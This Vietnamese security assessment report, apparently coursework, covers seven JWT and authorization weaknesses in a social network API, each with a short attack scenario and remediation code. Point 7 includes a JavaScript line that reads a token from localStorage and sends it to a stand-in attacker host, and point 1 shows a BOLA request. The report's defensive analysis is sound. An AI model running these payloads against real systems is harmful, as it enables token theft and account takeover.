# Báo cáo Đánh giá An toàn Bảo mật
## Hệ thống: Social Network API

---

## I. TỔNG QUAN HỆ THỐNG & MỤC TIÊU ĐÁNH GIÁ

Hệ thống Social Network API cung cấp các dịch vụ cốt lõi:
1. `POST /auth/login`: Xác thực danh tính người dùng (AuthN), cấp phát cặp mã thông báo JWT (**Access Token** ngắn hạn 15 phút và **Refresh Token** dài hạn 30 ngày).
2. `POST /auth/refresh`: Duy trì phiên làm việc, cấp mới Access Token mà không yêu cầu nhập lại mật khẩu (Token Rotation).
3. `GET /posts/{id}`: Truy xuất nội dung bài viết theo cơ chế phân quyền 3 lớp (AuthN $\rightarrow$ Scope AuthZ $\rightarrow$ Object-Level Authorization).

Báo cáo này phân tích chi tiết **7 điểm rủi ro an ninh tiềm tàng (Exposure Points / Vulnerabilities)** có thể bị khai thác nếu hệ thống không được thiết kế và cấu hình đúng chuẩn, kèm theo kịch bản tấn công (Proof of Concept) và giải pháp khắc phục triệt để bằng mã nguồn.

---

## II. BẢNG TỔNG HỢP 7 ĐIỂM CÓ THỂ LỘ / LỖ HỔNG BẢO MẬT

| # | Điểm lộ / Lỗ hổng | Nhóm lỗ hổng (OWASP API Top 10) | Mức độ nghiêm trọng | Endpoint liên quan |
| :-: | :--- | :--- | :---: | :--- |
| **1** | **BOLA (Broken Object Level Authorization)** | OWASP API1:2023 | 🔴 **CRITICAL** | `GET /posts/{id}` |
| **2** | **Rò rỉ dữ liệu nhạy cảm & PII trong JWT Payload** | OWASP API3:2023 / Slide 18 | 🟠 **HIGH** | `POST /auth/login` |
| **3** | **Tấn công Token Replay & Thiếu Revocation Blocklist** | OWASP API2:2023 / Slide 15 | 🟠 **HIGH** | `POST /auth/refresh` |
| **4** | **Lỗ hổng Algorithm Confusion & Bỏ qua xác minh `alg=none`** | OWASP API2:2023 / Slide 18 | 🔴 **CRITICAL** | Toàn bộ Protected APIs |
| **5** | **User Enumeration & Brute-force do thiếu Rate Limiting** | OWASP API2:2023 / Slide 29 | 🟡 **MEDIUM** | `POST /auth/login` |
| **6** | **Thời hạn sống (TTL) của Token quá dài & Thiếu Key Rotation** | OWASP API2:2023 / Slide 18 | 🟠 **HIGH** | `POST /auth/login` |
| **7** | **Lưu trữ Token tại `localStorage` dẫn đến mất cắp qua XSS** | Client Security / Slide 18 | 🟠 **HIGH** | Phía Client (SPA/Web) |

---

## III. PHÂN TÍCH CHI TIẾT TỪNG ĐIỂM LỘ & GIẢI PHÁP KHẮC PHỤC

---

### Điểm 1: Lỗ hổng BOLA (Broken Object Level Authorization) tại `GET /posts/{id}`
- **Phân loại:** OWASP API1:2023 (Lỗ hổng số 1 trong Top 10 rủi ro bảo mật API).
- **Mức độ:** 🔴 **CRITICAL** (Nguy hiểm chết người).

#### 1. Nguyên nhân gốc rễ (Root Cause)
API chỉ thực hiện kiểm tra xác thực ở **Lớp 1 (AuthN)** (người dùng đã đăng nhập và gửi kèm token hợp lệ) và **Lớp 2 (AuthZ Scope)** (token có chứa scope `posts:read`), nhưng **hoàn toàn bỏ qua Lớp 3 (Object Ownership / Privacy Policy)**.  
Hệ thống truy vấn cơ sở dữ liệu trực tiếp bằng câu lệnh `SELECT * FROM posts WHERE id = :id` và trả kết quả về cho client mà không kiểm tra xem bài viết đó có thuộc quyền sở hữu của caller hay không khi bài viết được đặt ở trạng thái `private` (chỉ mình tôi) hoặc `friends_only` (chỉ bạn bè).

#### 2. Kịch bản tấn công (Proof of Concept)
1. **Attacker (User B, ID=88)** đăng nhập vào hệ thống và nhận được một JWT token hợp lệ của chính mình.
2. **Victim (User A, ID=42)** tạo một bài viết bí mật cá nhân tại `id=101` với trạng thái `visibility="private"`.
3. Attacker gọi API:
   ```http
   GET /api/v1/posts/101 HTTP/1.1
   Host: api.social.net
   Authorization: Bearer <JWT_CUA_USER_B>
   ```
4. Nếu không có kiểm tra quyền đối tượng, server thấy token của User B hợp lệ nên trả về toàn bộ nội dung bí mật của User A với mã status `200 OK`.

#### 3. Biện pháp khắc phục (Remediation)
Triển khai bộ kiểm soát phân quyền 3 lớp (3-tier Authorization Stack) theo đúng bài giảng (Slide 24, 25, 26):
```python
# auth.py: Decorator kiểm tra quyền đối tượng chống BOLA
def check_post_access(post, current_user):
    # 1. Bài viết công khai: Mọi người dùng đã đăng nhập đều xem được
    if post.visibility == "public":
        return True
    
    # 2. Bài viết riêng tư: Bắt buộc caller phải là tác giả hoặc có role admin
    if post.visibility == "private":
        is_owner = (str(post.author_id) == str(current_user["id"]))
        is_admin = ("admin" in current_user.get("roles", []))
        return is_owner or is_admin

    # 3. Bài viết bạn bè: Kiểm tra quan hệ bạn bè trong DB
    if post.visibility == "friends_only":
        return is_friend_or_owner(post.author_id, current_user["id"])
    
    return False

@app.get("/api/v1/posts/<int:post_id>")
@jwt_required()
@require_scopes("posts:read") # Lớp 2: Kiểm tra Scope
def get_post(post_id):
    post = Post.query.get(post_id)
    if not post:
        return problem_details(404, "Post Not Found", f"Không tìm thấy bài viết ID={post_id}")
    
    # Lớp 3: Kiểm tra quyền truy cập trên chính đối tượng này
    current_user = get_current_user_from_jwt()
    if not check_post_access(post, current_user):
        # Trả về 403 Forbidden (hoặc 404 để chống enumeration)
        return problem_details(
            status=403,
            title="Forbidden Resource",
            detail="Bạn không có quyền xem bài viết riêng tư này của người dùng khác.",
            code="BOLA_ACCESS_DENIED"
        )
    
    return jsonify(post.to_dto()), 200
```

---

### Điểm 2: Rò rỉ Thông tin Nhạy cảm và PII trong JWT Payload
- **Phân loại:** OWASP API3:2023 (Broken Object Property Level Authorization) & Slide 18 (Lỗi 06).
- **Mức độ:** 🟠 **HIGH**.

#### 1. Nguyên nhân gốc rễ (Root Cause)
Một quan niệm sai lầm phổ biến là *"JWT được ký bảo vệ nên dữ liệu bên trong là bí mật"*.  
Thực tế: JWT thông thường (JWS - JSON Web Signature) chỉ **đảm bảo tính toàn vẹn (Integrity)** thông qua chữ ký số, còn phần Header và Payload chỉ được mã hóa dạng **Base64URL không bí mật**. Bất kỳ ai chặn được gói tin hoặc đọc được token đều có thể decode phần payload sang định dạng JSON văn bản rõ (plaintext) trong 1 giây.

Nếu lập trình viên đưa các trường như `password_hash`, `ssn` (CCCD), `phone_number`, `home_address` vào custom claims của JWT:
```json
// PAYLOAD BỊ RÒ RỈ THÔNG TIN
{
  "sub": "101",
  "email": "user@vnu.edu.vn",
  "pwd_hash": "$2b$12$N9qo8uLOickgx2Z...", // CỰC KỲ NGUY HIỂM!
  "phone": "0987654321",
  "national_id": "001202008899"
}
```

#### 2. Kịch bản tấn công
Kẻ tấn công sao chép token từ `Authorization` header hoặc log mạng của trình duyệt, truy cập `jwt.io` hoặc chạy lệnh:
```bash
python3 -c "import base64, json; print(json.loads(base64.urlsafe_b64decode('eyJzdWIi...==')))"
```
Toàn bộ chuỗi hash mật khẩu và dữ liệu cá nhân bị trích xuất, tạo điều kiện cho hacker crack offline bằng GPU hoặc thực hiện tấn công lừa đảo (social engineering).

#### 3. Biện pháp khắc phục
1. **Tuân thủ nguyên tắc Claims tối thiểu (Least Privilege Claims):** Payload JWT chỉ lưu các trường định danh và phân quyền cơ bản:
   - `sub`: ID duy nhất của người dùng.
   - `roles`: Danh sách vai trò (`["user", "admin"]`).
   - `scopes`: Danh sách quyền (`["posts:read", "posts:write"]`).
   - `exp`, `iat`, `jti`: Các trường metadata tiêu chuẩn.
2. **Tuyệt đối không lưu mật khẩu, chuỗi băm (hash), số thẻ tín dụng hoặc PII** trong claims.
3. Sử dụng DTO (Data Transfer Object) để lọc các trường trả về khi serialize thông tin user:
```python
def to_public_dto(user):
    return {
        "id": user.id,
        "username": user.username,
        "email": user.email,
        "roles": user.roles,
        "scopes": user.scopes
        # KHÔNG BAO GIỜ include user.password_hash!
    }
```

---

### Điểm 3: Tấn công Token Replay & Thiếu Cơ chế Thu hồi Token (Revocation Blocklist)
- **Phân loại:** OWASP API2:2023 (Broken Authentication) & Slide 15, 20.
- **Mức độ:** 🟠 **HIGH**.

#### 1. Nguyên nhân gốc rễ (Root Cause)
Do JWT mang đặc tính **Stateless** (Server không lưu trạng thái phiên), sau khi Client gọi `POST /auth/logout`, nếu server không lưu vết token đã bị vô hiệu hóa thì token đó vẫn tiếp tục hợp lệ cho tới thời điểm `exp` kết thúc.  
Đặc biệt đối với **Refresh Token** (thời hạn sống thường là 14 đến 30 ngày), nếu bị kẻ tấn công đánh cắp (Token Hijacking) và hệ thống không có cơ chế **Refresh Token Rotation (RTR)**, kẻ tấn công có thể vĩnh viễn duy trì quyền truy cập vào tài khoản nạn nhân.

#### 2. Kịch bản tấn công
1. Nạn nhân đăng nhập ở máy quán net hoặc bị dính phần mềm độc hại.
2. Kẻ tấn công đánh cắp được `refreshToken_1`.
3. Nạn nhân về nhà bấm "Đăng xuất". Server chỉ xóa token ở client mà không ghi nhận phía server.
4. Kẻ tấn công gửi `refreshToken_1` lên `POST /auth/refresh` và tiếp tục được cấp Access Token mới để thao tác.

#### 3. Biện pháp khắc phục
Triển khai cơ chế **Token Revocation Blocklist** và **Xoay vòng Refresh Token (Token Rotation)** (Slide 15, 16):
1. **Lưu `jti` (JWT ID duy nhất) bị thu hồi vào Blocklist** (Redis hoặc Cache in-memory với TTL bằng thời gian sống còn lại của token).
2. **Cơ chế Phát hiện Tấn công Lặp lại (Automatic Replay Detection):**
   - Mỗi lần gọi `POST /auth/refresh`, Refresh Token cũ ngay lập tức bị đưa vào blocklist.
   - Server cấp một Refresh Token mới toanh cùng Access Token mới.
   - Nếu phát hiện một Refresh Token đã từng bị thu hồi được gửi lên lần thứ hai $\rightarrow$ **Cảnh báo xâm nhập:** Ngay lập tức vô hiệu hóa toàn bộ tất cả token thuộc về phiên làm việc của user đó!

```python
# auth.py: Kiểm tra Blocklist thu hồi token
REVOKED_JTIS = set() # Trong production dùng Redis với TTL tự hủy

@jwt.token_in_blocklist_loader
def check_if_token_revoked(jwt_header, jwt_payload):
    jti = jwt_payload["jti"]
    return jti in REVOKED_JTIS

@app.post("/api/v1/auth/refresh")
@jwt_required(refresh=True)
def refresh_token_route():
    current_claims = get_jwt()
    old_jti = current_claims["jti"]
    user_id = get_jwt_identity()

    # Vô hiệu hóa Refresh Token cũ (Token Rotation)
    REVOKED_JTIS.add(old_jti)

    # Cấp phát cặp token mới
    new_access_token = create_access_token(identity=user_id, additional_claims=...)
    new_refresh_token = create_refresh_token(identity=user_id, additional_claims=...)
    return jsonify(accessToken=new_access_token, refreshToken=new_refresh_token), 200
```

---

### Điểm 4: Tấn công Algorithm Confusion & Lỗ hổng Chấp nhận `alg=none`
- **Phân loại:** OWASP API2:2023 (Broken Authentication) & Slide 18 (Lỗi 01, 02).
- **Mức độ:** 🔴 **CRITICAL**.

#### 1. Nguyên nhân gốc rễ (Root Cause)
1. **Lỗ hổng `alg=none`:** Chuẩn JWT cho phép token không có chữ ký với header `{"alg": "none"}`. Nếu thư viện xác thực phía backend không cấu hình chặn, kẻ tấn công chỉ cần tự tạo payload có `{"sub": "admin", "roles": ["admin"]}` và gửi lên mà không cần chữ ký số, hệ thống vẫn chấp nhận!
2. **Algorithm Confusion (Tráo đổi thuật toán đối xứng và bất đối xứng):**
   - Server dự định dùng thuật toán bất đối xứng **RS256** (Private Key để ký, Public Key để xác minh).
   - Kẻ tấn công lấy được Public Key của server (vốn là thông tin công khai).
   - Kẻ tấn công tự tạo token và đổi header thành `{"alg": "HS256"}` (thuật toán đối xứng HMAC).
   - Kẻ tấn công ký token bằng **chính Public Key RSA** (dưới dạng một chuỗi văn bản bí mật của HMAC).
   - Khi server nhận token, nếu code verify tin vào header `alg` từ client gửi lên và truyền Public Key vào hàm `jwt.decode()`, hàm verify HMAC sẽ dùng chuỗi Public Key để đối chiếu $\rightarrow$ Chữ ký khớp hoàn toàn $\rightarrow$ Hacker leo thang đặc quyền thành Admin!

#### 2. Biện pháp khắc phục
1. **Thiết lập danh sách trắng (Allowlist) cố định cho thuật toán:** Khóa cứng cấu hình `JWT_ALGORITHM = "HS256"` (hoặc `"RS256"`), từ chối tất cả các token có thuật toán khác với cấu hình hệ thống.
2. Tuyệt đối không bao giờ cho phép `alg=none`.
```python
# app.py
app.config["JWT_ALGORITHM"] = "HS256"
app.config["JWT_DECODE_ALGORITHMS"] = ["HS256"] # Bắt buộc chỉ chấp nhận HS256!
```

---

### Điểm 5: User Enumeration & Tấn công Brute-force tại `POST /auth/login`
- **Phân loại:** OWASP API2:2023 (Broken Authentication) & Slide 7, 29.
- **Mức độ:** 🟡 **MEDIUM** $\rightarrow$ 🟠 **HIGH**.

#### 1. Nguyên nhân gốc rễ (Root Cause)
1. **Thông báo lỗi phân biệt (User Enumeration):**
   - Nếu nhập email chưa đăng ký $\rightarrow$ Trả về `404: "Email không tồn tại trong hệ thống"`.
   - Nếu nhập email đúng nhưng sai mật khẩu $\rightarrow$ Trả về `401: "Mật khẩu không chính xác"`.
   $\rightarrow$ Kẻ tấn công viết script gửi hàng loạt danh sách email để lọc ra danh sách tài khoản hợp lệ của hệ thống, chuẩn bị cho các đợt tấn công lừa đảo tiếp theo.
2. **Thiếu cơ chế Rate Limiting:** Kẻ tấn công có thể thử 10.000 mật khẩu mỗi phút trên endpoint `/auth/login` bằng kỹ thuật Credential Stuffing mà không bị ngăn chặn.

#### 2. Biện pháp khắc phục
1. **Hợp nhất thông báo lỗi xác thực:** Luôn trả về thông báo lỗi chung kèm mã HTTP 401:
   ```json
   {
     "type": "https://api.social.net/errors/invalid-credentials",
     "title": "Authentication Failed",
     "status": 401,
     "detail": "Email hoặc mật khẩu không chính xác."
   }
   ```
2. **Áp dụng Rate Limiting chặt chẽ:** Sử dụng `Flask-Limiter` để giới hạn số lần thử:
   - Tối đa 5 lần thử đăng nhập sai trong 1 phút cho mỗi IP hoặc mỗi Email.
   - Khi vượt ngưỡng, trả về mã trạng thái **HTTP 429 Too Many Requests** kèm header `Retry-After: 60`.
3. **Băm mật khẩu an toàn:** Sử dụng **Argon2id** hoặc **bcrypt** với salt ngẫu nhiên và cost $\ge 12$ (Slide 27, 28) để làm tăng đáng kể chi phí tính toán nếu hacker cố tình brute-force.

---

### Điểm 6: Thời hạn Token quá dài (Unbounded Expiration) & Thiếu Secret Rotation
- **Phân loại:** OWASP API2:2023 & Slide 18 (Lỗi 03, 04).
- **Mức độ:** 🟠 **HIGH**.

#### 1. Nguyên nhân gốc rễ (Root Cause)
Một số hệ thống đặt thời hạn sống của Access Token quá dài (ví dụ: 7 ngày, 30 ngày hoặc không có claim `exp`). Khi người dùng bị lộ token (qua DevTools, qua log proxy hoặc bị tấn công MitM), kẻ tấn công có thể tự do mạo danh nạn nhân trong suốt thời gian dài mà không có cách nào chặn lại kịp thời.  
Ngoài ra, `JWT_SECRET_KEY` bị hardcode cố định trong mã nguồn hoặc không bao giờ được thay đổi (rotate).

#### 2. Biện pháp khắc phục
1. **Cấu hình thời hạn token ngắn hạn cho Access Token:**
   - `JWT_ACCESS_TOKEN_EXPIRES = 900` (15 phút).
   - `JWT_REFRESH_TOKEN_EXPIRES = 2592000` (30 ngày).
2. **Tách biệt Secret Key khỏi mã nguồn:** Lấy từ biến môi trường (`os.environ["JWT_SECRET_KEY"]`), đảm bảo độ dài tối thiểu 256-bit (32 byte ngẫu nhiên từ CSPRNG).
3. **Hỗ trợ Key Rotation:** Sử dụng header `kid` (Key ID) để hỗ trợ xoay vòng khóa ký định kỳ mà không làm ngắt quãng các token hợp lệ đang lưu hành.

---

### Điểm 7: Lưu trữ Token không an toàn tại Phía Client (XSS Vulnerability)
- **Phân loại:** Client-side Security & Slide 18 (Lỗi 05).
- **Mức độ:** 🟠 **HIGH**.

#### 1. Nguyên nhân gốc rễ (Root Cause)
Nhiều ứng dụng Single Page Application (React, Vue, Angular) lưu trữ JWT trực tiếp trong `window.localStorage` hoặc `sessionStorage`.  
Bất kỳ lỗ hổng XSS (Cross-Site Scripting) nào xuất hiện trên trang web (hoặc từ các thư viện bên thứ ba mã nguồn mở) đều cho phép hacker chạy đoạn mã JavaScript độc hại:
```javascript
const stolenToken = localStorage.getItem("accessToken");
fetch("https://attacker.evil/steal?token=" + stolenToken);
```
Ngay lập tức toàn bộ tài khoản người dùng bị chiếm đoạt mà nạn nhân không hề hay biết.

#### 2. Biện pháp khắc phục
1. **Mô hình bảo vệ chuẩn (BFF - Backend For Frontend hoặc Secure Cookies):**
   - **Refresh Token:** Lưu trong Cookie với các cờ bảo vệ tối đa:
     - `HttpOnly`: JavaScript hoàn toàn không thể đọc được cookie, triệt tiêu nguy cơ bị đánh cắp qua XSS.
     - `Secure`: Cookie chỉ được truyền qua kênh mã hóa HTTPS.
     - `SameSite=Strict`: Ngăn chặn hoàn toàn tấn công CSRF (Cross-Site Request Forgery).
   - **Access Token:** Lưu tạm trong biến bộ nhớ JavaScript (In-Memory / React State). Khi người dùng F5 hoặc reload trang, client tự động gọi `POST /auth/refresh` bằng cookie HttpOnly để lấy lại Access Token mới.

---

## IV. ĐỐI CHIẾU KIỂM TOÁN VỚI 3 ENDPOINT CỦA ĐỀ BÀI

| Yêu cầu kiểm toán | `POST /auth/login` | `POST /auth/refresh` | `GET /posts/{id}` |
| :--- | :--- | :--- | :--- |
| **Yêu cầu Xác thực (AuthN)** | Không (Public) | Bắt buộc Refresh Token | Bắt buộc Access Token |
| **Yêu cầu Scope (AuthZ)** | Không yêu cầu | `offline_access` | `posts:read` |
| **Kiểm tra Đối tượng (BOLA)** | Không áp dụng | Kiểm tra chủ thể token | **Bắt buộc:** Kiểm tra quyền xem bài viết `public` vs `private` |
| **Các mã lỗi có thể trả về** | `400`, `401`, `422`, `429` | `400`, `401`, `403`, `429` | `401`, `403`, `404`, `429` |
| **Cơ chế thu hồi (Revocation)** | Khởi tạo phiên | **Rotate Refresh Token**, đưa token cũ vào blocklist | Kiểm tra `jti` chưa bị thu hồi |
| **Định dạng lỗi** | RFC 7807 Problem Details | RFC 7807 Problem Details | RFC 7807 Problem Details |

---

## V. KẾT LUẬN & KIẾN NGHỊ TRIỂN KHAI

Để đảm bảo hệ thống API Social Network vận hành an toàn và tin cậy theo chuẩn công nghiệp:
1. **Luôn tuân thủ mô hình phân quyền 3 lớp:** Không bao giờ thỏa mãn chỉ với việc người dùng đã đăng nhập; mọi endpoint thao tác với tài nguyên cụ thể qua ID đều phải kiểm tra quyền đối tượng.
2. **Quản trị vòng đời token nghiêm ngặt:** Giữ Access Token ngắn hạn, xoay vòng Refresh Token và duy trì Blocklist thu hồi để có thể vô hiệu hóa phiên ngay lập tức khi phát hiện dấu hiệu bất thường.
3. **Mã hóa và xác thực mật khẩu chuẩn mực:** Sử dụng Argon2id hoặc bcrypt với cost phù hợp, kết hợp Rate Limiting để ngăn chặn các cuộc tấn công tự động hóa.

